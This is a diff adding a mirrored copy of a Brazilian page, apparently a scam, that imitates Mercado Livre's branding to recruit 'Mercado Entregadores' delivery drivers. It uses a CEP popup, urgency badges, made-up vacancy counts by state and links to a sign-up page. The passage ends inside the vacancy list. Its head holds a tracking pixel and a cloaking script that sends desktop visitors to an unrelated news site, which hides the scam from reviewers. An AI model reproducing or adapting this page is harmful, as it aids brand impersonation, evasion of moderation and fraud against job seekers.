@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from informacoesconfirmadas.shop/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 21:25:04 GMT -->
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Motorista Parceiro</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="css23585.html?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ml-yellow: #FFE600;
+            --ml-yellow-dark: #E6CF00;
+            --ml-yellow-light: #FFF9C4;
+            --ml-blue: #3483FA;
+            --ml-blue-dark: #2968C8;
+            --ml-blue-light: #4A90E2;
+            --ml-dark: #333333;
+            --ml-gray: #666666;
+            --ml-gray-light: #999999;
+            --ml-bg-light: #F5F5F5;
+            --ml-white: #FFFFFF;
+            --ml-green: #00A650;
+            --ml-red: #F23D4F;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; color: var(--ml-dark); line-height: 1.6; background: var(--ml-white); overflow-x: hidden; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .animate-on-scroll { opacity: 0; transform: translateY(40px); transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
+        .animate-on-scroll.visible { opacity: 1; transform: translateY(0); }
+        .animate-delay-1 { transition-delay: 0.1s; }
+        .animate-delay-2 { transition-delay: 0.2s; }
+        .animate-delay-3 { transition-delay: 0.3s; }
+        .animate-delay-4 { transition-delay: 0.4s; }
+        .cep-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; z-index: 9999; padding: 20px; }
+        .cep-overlay.hidden { display: none; }
+        .cep-popup { background: white; border-radius: 20px; padding: 40px; max-width: 450px; width: 100%; box-shadow: 0 25px 80px rgba(0, 0, 0, 0.3); animation: popupIn 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        @keyframes popupIn { from { opacity: 0; transform: scale(0.9) translateY(20px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+        .cep-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 25px; }
+        .cep-header h2 { font-size: 26px; font-weight: 800; color: var(--ml-dark); line-height: 1.3; max-width: 260px; }
+        .cep-divider { height: 2px; background: var(--ml-bg-light); margin-bottom: 25px; }
+        .cep-description { font-size: 16px; color: var(--ml-gray); margin-bottom: 25px; line-height: 1.6; }
+        .cep-label { font-size: 14px; font-weight: 600; color: var(--ml-dark); display: block; margin-bottom: 10px; }
+        .cep-input { width: 100%; padding: 18px 20px; border: 2px solid var(--ml-bg-light); border-radius: 12px; font-size: 18px; font-weight: 500; color: var(--ml-dark); transition: all 0.3s ease; margin-bottom: 20px; }
+        .cep-input:focus { outline: none; border-color: var(--ml-blue); box-shadow: 0 0 0 4px rgba(52, 131, 250, 0.1); }
+        .cep-input::placeholder { color: var(--ml-gray-light); }
+        .cep-btn { width: 100%; padding: 18px; background: var(--ml-blue); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; }
+        .cep-btn:hover { background: var(--ml-blue-dark); transform: translateY(-2px); box-shadow: 0 8px 25px rgba(52, 131, 250, 0.3); }
+        .cep-btn-secondary { width: 100%; padding: 18px; background: white; color: var(--ml-dark); border: 2px solid var(--ml-bg-light); border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; margin-bottom: 12px; }
+        .cep-btn-secondary:hover { background: var(--ml-bg-light); }
+        .cep-result { display: flex; align-items: center; gap: 15px; background: rgba(0, 166, 80, 0.08); border: 2px solid var(--ml-green); border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; }
+        .cep-location-icon { width: 44px; height: 44px; background: var(--ml-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .cep-location-icon svg { width: 22px; height: 22px; color: white; }
+        .cep-location-info { display: flex; flex-direction: column; gap: 2px; }
+        .cep-location-info span { font-size: 15px; color: var(--ml-dark); }
+        .cep-location-info strong { color: var(--ml-dark); font-weight: 700; }
+        .cep-disponivel { font-size: 14px; color: var(--ml-green) !important; font-weight: 600; }
+        .header { background: #FFE600; padding: 12px 20px; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header-content { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: flex-start; }
+        .motorista-badge-bar { background: var(--ml-blue); padding: 10px 20px; }
+        .badge-content { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; gap: 10px; }
+        .badge-arrow { color: var(--ml-yellow); display: flex; align-items: center; }
+        .badge-arrow svg { width: 24px; height: 24px; }
+        .badge-text { display: flex; flex-direction: column; line-height: 1.2; }
+        .badge-title { font-size: 16px; font-weight: 700; color: var(--ml-white); }
+        .badge-subtitle { font-size: 13px; font-weight: 400; color: rgba(255,255,255,0.9); }
+        .urgency-badge { margin-left: auto; background: var(--ml-red); color: white; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; animation: pulse 1.5s infinite; display: flex; align-items: center; gap: 6px; }
+        .urgency-badge::before { content: '🔥'; }
+        .hero-capa { width: 100%; position: relative; overflow: hidden; }
+        .capa-img { width: 100%; max-width: 100%; height: auto; display: block; transition: transform 0.5s ease; }
+        .hero-capa:hover .capa-img { transform: scale(1.02); }
+        .hero { background: linear-gradient(180deg, var(--ml-white) 0%, var(--ml-bg-light) 100%); padding: 60px 20px 80px; position: relative; overflow: hidden; }
+        .hero::before { content: ''; position: absolute; top: -50%; right: -20%; width: 600px; height: 600px; background: radial-gradient(circle, rgba(52, 131, 250, 0.05) 0%, transparent 70%); border-radius: 50%; animation: float 6s ease-in-out infinite; }
+        .hero-content { max-width: 800px; margin: 0 auto; text-align: center; position: relative; z-index: 1; }
+        .hero-text h1 { font-size: 44px; font-weight: 800; color: var(--ml-dark); line-height: 1.2; margin-bottom: 20px; animation: fadeInUp 0.8s ease-out; }
+        .hero-text h1 span { background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-dark) 100%); color: white; padding: 4px 16px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3); }
+        .hero-text > p { font-size: 18px; color: var(--ml-gray); margin-bottom: 30px; animation: fadeInUp 0.8s ease-out 0.2s backwards; }
+        .hero-cta { display: flex; gap: 16px; flex-wrap: wrap; justify-content: center; animation: fadeInUp 0.8s ease-out 0.4s backwards; }
+        .btn-primary { background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-dark) 100%); color: white; padding: 18px 36px; border-radius: 12px; font-size: 16px; font-weight: 700; text-decoration: none; display: inline-flex; align-items: center; gap: 10px; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3); position: relative; overflow: hidden; }
+        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(52, 131, 250, 0.4); }
+        .btn-secondary { background: transparent; color: var(--ml-dark); padding: 18px 36px; border-radius: 12px; font-size: 16px; font-weight: 600; text-decoration: none; border: 2px solid var(--ml-dark); transition: all 0.3s ease; }
+        .btn-secondary:hover { background: var(--ml-dark); color: white; transform: translateY(-3px); }
+        .requisitos { background: var(--ml-white); padding: 70px 20px; position: relative; }
+        .requisitos::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, var(--ml-blue), var(--ml-blue-light), var(--ml-blue)); }
+        .requisitos-content { max-width: 900px; margin: 0 auto; }
+        .requisitos h2 { font-size: 28px; font-weight: 800; color: var(--ml-dark); margin-bottom: 30px; text-transform: uppercase; letter-spacing: -0.5px; }
+        .requisitos-list { display: flex; flex-direction: column; gap: 16px; }
+        .requisito-item { display: flex; align-items: flex-start; gap: 16px; background: var(--ml-bg-light); padding: 20px 24px; border-radius: 16px; transition: all 0.3s ease; border: 1px solid #E5E5E5; }
+        .requisito-item:hover { background: var(--ml-white); transform: translateX(10px); border-color: var(--ml-blue); box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
+        .requisito-icon { width: 36px; height: 36px; background: linear-gradient(135deg, var(--ml-green) 0%, #00c853 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; box-shadow: 0 4px 12px rgba(0, 166, 80, 0.3); }
+        .requisito-icon svg { width: 20px; height: 20px; color: white; }
+        .requisito-text { font-size: 16px; color: var(--ml-dark); font-weight: 500; }
+        .como-funciona { padding: 100px 20px; background: linear-gradient(180deg, var(--ml-white) 0%, var(--ml-bg-light) 100%); }
+        .section-title { text-align: center; margin-bottom: 60px; }
+        .section-title h2 { font-size: 36px; font-weight: 800; color: var(--ml-dark); margin-bottom: 16px; }
+        .section-title p { font-size: 18px; color: var(--ml-gray); max-width: 600px; margin: 0 auto; }
+        .section-title::after { content: ''; display: block; width: 80px; height: 5px; background: linear-gradient(90deg, var(--ml-blue), var(--ml-blue-light)); margin: 25px auto 0; border-radius: 3px; }
+        .steps-container { max-width: 600px; margin: 0 auto; display: flex; flex-direction: column; gap: 40px; position: relative; }
+        .step-card { text-align: center; position: relative; z-index: 1; }
+        .step-number { width: 80px; height: 80px; background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-dark) 100%); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: 800; margin: 0 auto 20px; box-shadow: 0 8px 25px rgba(52, 131, 250, 0.3); transition: all 0.3s ease; border: 5px solid white; }
+        .step-card:hover .step-number { transform: scale(1.1); box-shadow: 0 12px 35px rgba(52, 131, 250, 0.4); }
+        .step-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: var(--ml-dark); }
+        .step-card p { font-size: 15px; color: var(--ml-gray); line-height: 1.5; }
+        .vagas { padding: 100px 20px; background: var(--ml-bg-light); }
+        .vagas-grid { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .vaga-card { background: white; border-radius: 16px; padding: 24px; display: flex; flex-direction: column; gap: 20px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); transition: all 0.3s ease; border: 1px solid #E5E5E5; position: relative; overflow: hidden; }
+        .vaga-card:hover { transform: translateY(-4px); box-shadow: 0 12px 40px rgba(0,0,0,0.12); border-color: #D0D0D0; }
+        .vaga-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+        .vaga-estado-wrapper { display: flex; align-items: center; gap: 12px; }
+        .vaga-bandeira { width: 36px; height: 26px; border-radius: 4px; object-fit: cover; box-shadow: 0 1px 3px rgba(0,0,0,0.15); }
+        .vaga-estado { font-size: 18px; font-weight: 700; color: var(--ml-dark); }
+        .vaga-count { background: #FEE2E2; color: #DC2626; padding: 8px 16px; border-radius: 20px; font-size: 14px; font-weight: 600; }
+        .vaga-btn { background: var(--ml-blue); color: white; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 600; text-decoration: none; text-align: center; transition: all 0.2s ease; border: none; cursor: pointer; width: 100%; display: block; }
+        .vaga-btn:hover { background: var(--ml-blue-dark); box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3); }
+        .vantagens { padding: 100px 20px; background: white; position: relative; }
+        .vantagens-grid { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; position: relative; z-index: 1; }
+        .vantagem-card { background: var(--ml-white); border: 2px solid var(--ml-bg-light); border-radius: 20px; padding: 35px 30px; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); position: relative; overflow: hidden; }
+        .vantagem-card:hover { border-color: var(--ml-blue); transform: translateY(-8px); box-shadow: 0 25px 60px rgba(0,0,0,0.1); }
+        .vantagem-icon { width: 65px; height: 65px; background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-light) 100%); border-radius: 16px; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; transition: all 0.3s ease; }
+        .vantagem-card:hover .vantagem-icon { transform: scale(1.1) rotate(-5deg); }
+        .vantagem-icon svg { width: 32px; height: 32px; color: var(--ml-white); }
+        .vantagem-card h3 { font-size: 20px; font-weight: 700; margin-bottom: 12px; color: var(--ml-dark); }
+        .vantagem-card p { font-size: 15px; color: var(--ml-gray); line-height: 1.7; }
+        .depoimentos { padding: 100px 20px; background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-dark) 100%); position: relative; overflow: hidden; }
+        .depoimentos .section-title h2, .depoimentos .section-title p { color: white; }
+        .depoimentos .section-title::after { background: linear-gradient(90deg, white, rgba(255,255,255,0.5)); }
+        .depoimentos-grid { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; position: relative; z-index: 1; }
+        .depoimento-card { background: white; border-radius: 20px; padding: 30px; text-align: center; transition: all 0.4s ease; }
+        .depoimento-card:hover { transform: translateY(-10px); box-shadow: 0 30px 60px rgba(0,0,0,0.2); }
+        .depoimento-avatar { width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 20px; background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-light) 100%); display: flex; align-items: center; justify-content: center; font-size: 36px; box-shadow: 0 8px 25px rgba(52, 131, 250, 0.25); }
+        .depoimento-stars { color: #FFC107; font-size: 20px; margin-bottom: 15px; letter-spacing: 2px; }
+        .depoimento-text { font-size: 15px; color: var(--ml-gray); line-height: 1.7; margin-bottom: 20px; font-style: italic; }
+        .depoimento-text::before { content: '"'; font-size: 40px; color: var(--ml-blue); line-height: 0; vertical-align: middle; margin-right: 5px; }
+        .depoimento-name { font-weight: 700; color: var(--ml-dark); font-size: 16px; }
+        .depoimento-info { font-size: 13px; color: var(--ml-gray-light); }
+        .stats { padding: 80px 20px; background: white; }
+        .stats-grid { max-width: 900px; margin: 0 auto; display: grid; grid-template-columns: repeat(3, 1fr); gap: 40px; text-align: center; }
+        .stat-item { padding: 30px; border-radius: 20px; background: var(--ml-bg-light); transition: all 0.3s ease; }
+        .stat-item:hover { background: var(--ml-blue); transform: scale(1.05); }
+        .stat-item h3 { font-size: 52px; font-weight: 800; color: var(--ml-blue); margin-bottom: 8px; transition: color 0.3s ease; }
+        .stat-item:hover h3 { color: var(--ml-white); }
+        .stat-item p { font-size: 16px; color: var(--ml-gray); font-weight: 500; transition: color 0.3s ease; }
+        .stat-item:hover p { color: rgba(255,255,255,0.9); }
+        .cta-banner { background: linear-gradient(135deg, #F8F9FA 0%, #FFFFFF 100%); padding: 80px 20px; text-align: center; position: relative; overflow: hidden; border-top: 1px solid #E5E5E5; border-bottom: 1px solid #E5E5E5; }
+        .cta-content { max-width: 700px; margin: 0 auto; position: relative; z-index: 1; }
+        .cta-content h2 { font-size: 32px; font-weight: 800; color: var(--ml-dark); margin-bottom: 16px; }
+        .cta-content p { font-size: 17px; color: var(--ml-gray); margin-bottom: 30px; line-height: 1.7; }
+        .faq { padding: 100px 20px; background: var(--ml-bg-light); }
+        .faq-container { max-width: 750px; margin: 0 auto; }
+        .faq-item { background: white; border-radius: 16px; margin-bottom: 16px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); transition: all 0.3s ease; }
+        .faq-item:hover { box-shadow: 0 8px 30px rgba(0,0,0,0.1); }
+        .faq-question { padding: 24px 28px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; font-size: 17px; font-weight: 600; color: var(--ml-dark); transition: all 0.3s ease; }
+        .faq-question:hover { color: var(--ml-blue); }
+        .faq-icon { width: 28px; height: 28px; color: var(--ml-blue); transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); flex-shrink: 0; }
+        .faq-answer { padding: 0 28px 24px; font-size: 15px; color: var(--ml-gray); line-height: 1.8; display: none; }
+        .faq-item.active .faq-answer { display: block; animation: fadeInUp 0.4s ease; }
+        .faq-item.active .faq-icon { transform: rotate(180deg); }
+        .faq-item.active { border: 2px solid var(--ml-blue); }
+        .footer { background: var(--ml-yellow); padding: 30px 20px; text-align: center; margin-top: auto; }
+        .footer p { font-size: 13px; color: var(--ml-dark); margin-bottom: 5px; }
+        .footer-copy { font-size: 12px; color: var(--ml-gray); margin-top: 10px; }
+        @media (max-width: 992px) { .vantagens-grid, .depoimentos-grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 768px) { .hero-text h1 { font-size: 32px; } .vantagens-grid, .depoimentos-grid { grid-template-columns: 1fr; } .stats-grid { grid-template-columns: 1fr; gap: 20px; } .urgency-badge { display: none; } }
+        @media (max-width: 480px) { .hero-text h1 { font-size: 28px; } .vagas-grid { grid-template-columns: 1fr; } .section-title h2 { font-size: 28px; } }
+    </style>
+   
+<script>
+  window.pixelId = "6987d3b2e68b6f5a7bf9e036";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "../cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script src="../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+</head>
+<body>
+    
+
+    <div class="cep-overlay" id="cepOverlay">
+        <div class="cep-popup">
+            <div class="cep-header">
+                <h2>Bem-vindo ao Mercado Entregadores</h2>
+                <img src="053Pbb0T/image.png" alt="Mercado Entregadores" class="cep-logo" style="width: 50px; height: auto;">
+            </div>
+            <div class="cep-divider"></div>
+            <div class="cep-step" id="cepStep1">
+                <p class="cep-description">Para continuar, informe seu CEP para verificarmos a disponibilidade na sua região.</p>
+                <label class="cep-label">CEP</label>
+                <input type="text" id="cepInput" class="cep-input" placeholder="00000-000" maxlength="9">
+                <button class="cep-btn" id="verificarBtn">Verificar CEP</button>
+            </div>
+            <div class="cep-step" id="cepStep2" style="display: none;">
+                <p class="cep-description">Para continuar, informe seu CEP para verificarmos a disponibilidade na sua região.</p>
+                <label class="cep-label">CEP</label>
+                <div class="cep-input" id="cepFilled" style="background: var(--ml-bg-light);">00000-000</div>
+                <div class="cep-result">
+                    <div class="cep-location-icon">
+                        <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                            <circle cx="12" cy="10" r="3"></circle>
+                        </svg>
+                    </div>
+                    <div class="cep-location-info">
+                        <span>Localização: <strong id="cidadeEstado">Cidade/UF</strong></span>
+                        <span class="cep-disponivel">Entregas disponíveis para sua região</span>
+                    </div>
+                </div>
+                <button class="cep-btn-secondary" id="novoCepBtn">Buscar novo CEP</button>
+                <button class="cep-btn" id="confirmarBtn">Confirmar</button>
+            </div>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <img src="053Pbb0T/image.png" alt="" style="width: 45px; height: auto;">
+                    <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                        <span style="font-size: 26px; font-weight: 700; color: #2D3277;">mercado</span>
+                        <span style="font-size: 26px; font-weight: 700; color: #2D3277;">entregadores</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="motorista-badge-bar">
+        <div class="badge-content">
+            <div class="badge-arrow">
+                <svg viewbox="0 0 24 24" fill="currentColor">
+                    <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"></path>
+                    <path d="M4.59 16.59L9.17 12 4.59 7.41 6 6l6 6-6 6-1.41-1.41z"></path>
+                </svg>
+            </div>
+            <div class="badge-text">
+                <span class="badge-title">Motorista Parceiro</span>
+                <span class="badge-subtitle">Mercado Entregadores</span>
+            </div>
+            <div class="urgency-badge">Vagas Limitadas!</div>
+        </div>
+    </div>
+
+    <section class="hero-capa">
+        <img src="TPNQxyZN/image.png" alt="Motorista Parceiro Mercado Entregadores" class="capa-img">
+    </section>
+
+    <section class="hero">
+        <div class="hero-content">
+            <div class="hero-text">
+                <h1>Ganhe dinheiro sendo um <span>motorista</span> parceiro Mercado Entregadores</h1>
+                <p>Transforme seu veículo em uma fonte de renda extra com horários flexíveis e pagamentos instantâneos.</p>
+                <div class="hero-cta">
+                    <a href="#vagas" class="btn-primary">Cadastre-se agora
+                        <svg width="20" height="20" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
+                    </a>
+                    <a href="#como-funciona" class="btn-secondary">Saiba mais</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="requisitos">
+        <div class="requisitos-content">
+            <h2 class="animate-on-scroll">Pré-requisitos para ser um Motorista de Entregas Parceiro</h2>
+            <div class="requisitos-list">
+                <div class="requisito-item animate-on-scroll animate-delay-1">
+                    <div class="requisito-icon"><svg viewbox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+                    <div class="requisito-text">Ter CNH válida</div>
+                </div>
+                <div class="requisito-item animate-on-scroll animate-delay-2">
+                    <div class="requisito-icon"><svg viewbox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+                    <div class="requisito-text">Veículo com licenciamento válido (fabricado a partir do ano de 1998 e em bom estado de conservação)</div>
+                </div>
+                <div class="requisito-item animate-on-scroll animate-delay-3">
+                    <div class="requisito-icon"><svg viewbox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+                    <div class="requisito-text">O Mercado Entregadores aceita para entregas carros de passeio 2 ou 4 portas, Motos, Fiorino, Kombi e Vans</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="como-funciona" id="como-funciona">
+        <div class="section-title animate-on-scroll">
+            <h2>Como se cadastrar</h2>
+            <p>O cadastro é totalmente online e leva apenas alguns minutos</p>
+        </div>
+        <div class="steps-container">
+            <div class="step-card animate-on-scroll animate-delay-1">
+                <div class="step-number">1</div>
+                <h3>Verifique vagas</h3>
+                <p>Confira a disponibilidade de vagas na sua região</p>
+            </div>
+            <div class="step-card animate-on-scroll animate-delay-2">
+                <div class="step-number">2</div>
+                <h3>Informe seus dados</h3>
+                <p>Preencha o modelo do seu veículo e dados pessoais</p>
+            </div>
+            <div class="step-card animate-on-scroll animate-delay-3">
+                <div class="step-number">3</div>
+                <h3>Inicie o cadastro</h3>
+                <p>Se houver vagas disponíveis, clique no botão para iniciar</p>
+            </div>
+            <div class="step-card animate-on-scroll animate-delay-4">
+                <div class="step-number">4</div>
+                <h3>Aguarde aprovação</h3>
+                <p>Finalize o processo e aguarde a aprovação</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="vagas" id="vagas">
+        <div class="section-title animate-on-scroll">
+            <h2>Vagas para Motorista Parceiro</h2>
+            <p>Vagas disponíveis na sua região</p>
+        </div>
+        <div class="vagas-grid" id="vagasGrid">
+            <div class="vaga-card animate-on-scroll" data-estado="AC"><div class="vaga-header"><span class="vaga-estado">Acre (AC)</span><span class="vaga-count">4 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="AL"><div class="vaga-header"><span class="vaga-estado">Alagoas (AL)</span><span class="vaga-count">5 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="AP"><div class="vaga-header"><span class="vaga-estado">Amapá (AP)</span><span class="vaga-count">3 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="AM"><div class="vaga-header"><span class="vaga-estado">Amazonas (AM)</span><span class="vaga-count">7 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="BA"><div class="vaga-header"><span class="vaga-estado">Bahia (BA)</span><span class="vaga-count">10 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="CE"><div class="vaga-header"><span class="vaga-estado">Ceará (CE)</span><span class="vaga-count">8 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="DF"><div class="vaga-header"><span class="vaga-estado">Distrito Federal (DF)</span><span class="vaga-count">12 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="ES"><div class="vaga-header"><span class="vaga-estado">Espírito Santo (ES)</span><span class="vaga-count">6 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="GO"><div class="vaga-header"><span class="vaga-estado">Goiás (GO)</span><span class="vaga-count">22 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="MA"><div class="vaga-header"><span class="vaga-estado">Maranhão (MA)</span><span class="vaga-count">5 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="MT"><div class="vaga-header"><span class="vaga-estado">Mato Grosso (MT)</span><span class="vaga-count">6 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="MS"><div class="vaga-header"><span class="vaga-estado">Mato Grosso do Sul (MS)</span><span class="vaga-count">5 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="MG"><div class="vaga-header"><span class="vaga-estado">Minas Gerais (MG)</span><span class="vaga-count">14 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="PA"><div class="vaga-header"><span class="vaga-estado">Pará (PA)</span><span class="vaga-count">7 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="PB"><div class="vaga-header"><span class="vaga-estado">Paraíba (PB)</span><span class="vaga-count">5 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="PR"><div class="vaga-header"><span class="vaga-estado">Paraná (PR)</span><span class="vaga-count">11 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="PE"><div class="vaga-header"><span class="vaga-estado">Pernambuco (PE)</span><span class="vaga-count">9 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="PI"><div class="vaga-header"><span class="vaga-estado">Piauí (PI)</span><span class="vaga-count">4 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="RJ"><div class="vaga-header"><span class="vaga-estado">Rio de Janeiro (RJ)</span><span class="vaga-count">18 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="RN"><div class="vaga-header"><span class="vaga-estado">Rio Grande do Norte (RN)</span><span class="vaga-count">5 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="RS"><div class="vaga-header"><span class="vaga-estado">Rio Grande do Sul (RS)</span><span class="vaga-count">12 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="RO"><div class="vaga-header"><span class="vaga-estado">Rondônia (RO)</span><span class="vaga-count">4 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="RR"><div class="vaga-header"><span class="vaga-estado">Roraima (RR)</span><span class="vaga-count">3 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="SC"><div class="vaga-header"><span class="vaga-estado">Santa Catarina (SC)</span><span class="vaga-count">10 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="SP"><div class="vaga-header"><span class="vaga-estado">São Paulo (SP)</span><span class="vaga-count">26 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+            <div class="vaga-card animate-on-scroll" data-estado="SE"><div class="vaga-header"><span class="vaga-estado">Sergipe (SE)</span><span class="vaga-count">4 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
